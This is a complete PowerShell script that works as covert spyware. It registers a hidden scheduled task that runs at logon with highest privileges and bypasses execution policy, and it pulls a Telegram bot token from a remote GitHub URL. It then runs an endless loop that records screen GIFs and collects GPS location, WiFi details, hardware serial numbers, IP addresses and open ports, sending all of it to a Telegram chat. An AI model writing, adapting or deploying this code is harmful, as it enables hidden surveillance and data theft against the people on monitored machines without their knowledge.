param(
    [switch]$background
)

# -------------------------------
# If not running in background mode, register a scheduled task and exit
# -------------------------------
if (-not $background) {
    $taskName = "ScreenCaptureTelegramBot"
    
    # Determine the full path of the script
    if ($PSCommandPath) {
        $scriptPath = $PSCommandPath
    }
    else {
        $scriptPath = $MyInvocation.MyCommand.Definition
    }

    # Build the task command line (note the escaped quotes around the script path)
    $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"

    # Create the scheduled task using schtasks.exe; the task is set to run at logon with highest privileges
    $createTask = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
    if ($LASTEXITCODE -eq 0) {
        Write-Output "Scheduled task '$taskName' registered successfully."
        # Optionally, start the task immediately
        schtasks.exe /run /tn $taskName
    }
    else {
        Write-Error "Failed to register scheduled task. Command output: $createTask"
    }
    exit
}

# ===============================
# Enable DPI Awareness to capture full resolution on high DPI screens
# ===============================
Add-Type -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
"@ -Name NativeMethods -Namespace MyNamespace
[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null

# ===============================
# Configuration & Credentials from Remote Source
# ===============================
$credUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
try {
    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing).Content
    $Cred = $CredJson | ConvertFrom-Json
}
catch {
    Write-Error "Failed to retrieve credentials from remote URL: $_"
    exit
}

# ===============================
# Decrypt-Credential Function (checks for encrypted format)
# ===============================
function Decrypt-Credential {
    param ([string]$EncryptedString)
    if ($EncryptedString -match '^01000000') {
        try {
            $secure = ConvertTo-SecureString $EncryptedString -ErrorAction Stop
            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
            $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
            return $plain
        }
        catch {
            return $EncryptedString
        }
    }
    else {
        return $EncryptedString
    }
}

$BotToken = Decrypt-Credential -EncryptedString $Cred.BotToken
$ChatID   = Decrypt-Credential -EncryptedString $Cred.ChatID

# ===============================
# Function: Capture a single screenshot frame as a BitmapSource
# ===============================
function Capture-Frame {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName PresentationCore

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    $hBitmap = $bmp.GetHbitmap()
    $bitmapSource = [System.Windows.Interop.Imaging]::CreateBitmapSourceFromHBitmap(
        $hBitmap,
        [IntPtr]::Zero,
        [System.Windows.Int32Rect]::new(0,0,$bmp.Width,$bmp.Height),
        [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
    )
    Add-Type -MemberDefinition @"
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
"@ -Name GDI32 -Namespace Win32
    [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
    $bmp.Dispose()
    return $bitmapSource
}

# ===============================
# Function: Capture an Animated GIF of the Screen over a Given Duration
# ===============================
function Capture-AnimatedGIF {
    param(
        [int]$durationSeconds = 10,
        [int]$framesPerSecond = 3
    )
    Add-Type -AssemblyName PresentationCore

    $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
    $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
    $frameInterval = 1 / $framesPerSecond

    for ($i = 0; $i -lt $totalFrames; $i++) {
        $frame = Capture-Frame
        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
        Start-Sleep -Seconds $frameInterval
    }
    $gifPath = "C:\Temp\screenrecord.gif"
    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
    $encoder.Save($fs)
    $fs.Close()
    return $gifPath
}

# ===============================
# Function: Send an Animation (GIF) to the Telegram Bot
# ===============================
function Send-TelegramAnimation {
    param (
        [string]$GifPath
    )
    
    $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
    
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $LF = "`r`n"
    
    $ms = New-Object System.IO.MemoryStream
    
    $chatIdHeader = "--$Boundary$LF" +
                    'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                    $ChatID + $LF
    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
    
    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
    $fileHeader = "--$Boundary$LF" +
                  'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
                  "Content-Type: image/gif$LF$LF"
    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    
    $ending = "$LF--$Boundary--$LF"
    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
    $ms.Write($endingBytes, 0, $endingBytes.Length)
    
    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $ContentBytes = $ms.ToArray()
    
    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
    $WebRequest.ContentLength = $ContentBytes.Length
    
    $Stream = $WebRequest.GetRequestStream()
    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
    $Stream.Close()
    
    $Response = $WebRequest.GetResponse()
    $ResponseStream = $Response.GetResponseStream()
    $Reader = New-Object System.IO.StreamReader($ResponseStream)
    $null = $Reader.ReadToEnd() | Out-Null
    $Reader.Close()
    $ResponseStream.Close()
    $Response.Close()
}

# ===============================
# Function: Send a Text Message to the Telegram Bot
# ===============================
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }
    try {
        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
    }
    catch {
        Write-Error "Failed to send message: $_"
    }
}

# ===============================
# Function: Get Native GPS Location using Windows Location Services
# ===============================
Add-Type -AssemblyName System.Device
function Get-WindowsGeolocation {
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    
    $timeout = 30
    while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
        Start-Sleep -Milliseconds 100
        $timeout--
    }

    if ($watcher.Position.Location.IsUnknown) {
        return $null
    }

    return @{
        Latitude = $watcher.Position.Location.Latitude
        Longitude = $watcher.Position.Location.Longitude
        Accuracy = $watcher.Position.Location.HorizontalAccuracy
    }
}

# ===============================
# Function: Get Complete System & Network Information
# ===============================
function Get-CompleteSystemInfo {
    $computerName = $env:COMPUTERNAME
    $osInstance = Get-CimInstance Win32_OperatingSystem
    $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
    $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

    $basicInfo = "=== Basic System Information ===`n" +
                 "Computer Name: $computerName`n" +
                 "OS: $osInfo`n" +
                 "Date/Time: $dateTime`n"

    try {
        $wifiOutput = netsh wlan show interfaces | Out-String
        $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        $signal = ($wifiOutput | Select-String "^\s*Signal\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        if (-not $ssid) { $ssid = "N/A" }
        if (-not $signal) { $signal = "N/A" }
    }
    catch {
        $ssid = "N/A"
        $signal = "N/A"
    }
    $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"

    $geo = Get-WindowsGeolocation
    if ($geo) {
        $locationInfo = "Latitude: $($geo.Latitude), Longitude: $($geo.Longitude) (Accuracy: $($geo.Accuracy) m)"
    }
    else {
        $locationInfo = "Location unavailable. Ensure Location Services are enabled."
    }
    $locationSection = "GPS Location: $locationInfo`n"

    $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
    $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
    $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
    $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes

    $systemInfoSection = "=== Detailed System Information ===`n" +
                         "Manufacturer: $($cs.Manufacturer)`n" +
                         "Model: $($cs.Model)`n" +
                         "MTM: $($csp.Name)`n"
    if ($csp.Version) {
        $systemInfoSection += "Product Version: $($csp.Version)`n"
    }
    $biosSection = "`nBIOS Information:`n" +
                   "  Serial Number: $($bios.SerialNumber)`n" +
                   "  BIOS Version: $($bios.Version)`n" +
                   "  Release Date: $($bios.ReleaseDate)`n"
    $enclosureSection = "`nSystem Enclosure:`n" +
                        "  Serial Number: $($enclosure.SerialNumber)`n" +
                        "  Chassis Type: $($enclosure.ChassisTypes)`n"
    $productSection = "`nProduct Information:`n" +
                      "  SN: $($csp.IdentifyingNumber)`n" +
                      "  UUID: $($csp.UUID)`n" +
                      "  Vendor: $($csp.Vendor)`n"

    $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                   Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                   Select-Object InterfaceAlias, IPAddress, PrefixLength
    $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
    foreach ($ip in $ipAddresses) {
        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress)/$($ip.PrefixLength)`n"
    }

    try {
        $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
        if ($wifiAdapter) {
            $wifiDetails = netsh wlan show interfaces | Out-String
            $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
            $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
            $wifiSection = "`nWiFi Details:`nESSID: $essid`nBSSID: $bssid`n"
        }
        else {
            $wifiSection = "`nNo active WiFi interface found.`n"
        }
    }
    catch {
        $wifiSection = "`nError retrieving WiFi details.`n"
    }

    try {
        $listeningPorts = Get-NetTCPConnection -State Listen | 
                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
                          Select-Object LocalAddress, LocalPort, 
                              @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}},
                              OwningProcess
        $portsSection = "`nOpen Ports:`n"
        foreach ($port in $listeningPorts) {
            $portsSection += "IP: $($port.LocalAddress) Port: $($port.LocalPort) Process: $($port.Process)`n"
        }
    }
    catch {
        $portsSection = "`nError retrieving open ports.`n"
    }

    $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
    $adaptersSection = "`nNetwork Adapters:`n"
    foreach ($adapter in $adapters) {
        $adaptersSection += "Name: $($adapter.Name) - $($adapter.InterfaceDescription) - Speed: $($adapter.LinkSpeed)`n"
    }

    $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
    $gatewaySection = "`nDefault Gateway:`n"
    foreach ($route in $defaultGateway) {
        $gatewaySection += "NextHop: $($route.NextHop) via $($route.InterfaceAlias)`n"
    }

    return $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
}

# ===============================
# Main Loop: Capture & Send a 10-Second Screen Recording (as Animated GIF)
# and send complete system information
# ===============================
while ($true) {
    $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
    Send-TelegramAnimation -GifPath $gifPath
    $systemInfo = Get-CompleteSystemInfo
    Send-TelegramMessage -Message $systemInfo
    Start-Sleep -Seconds 2
}
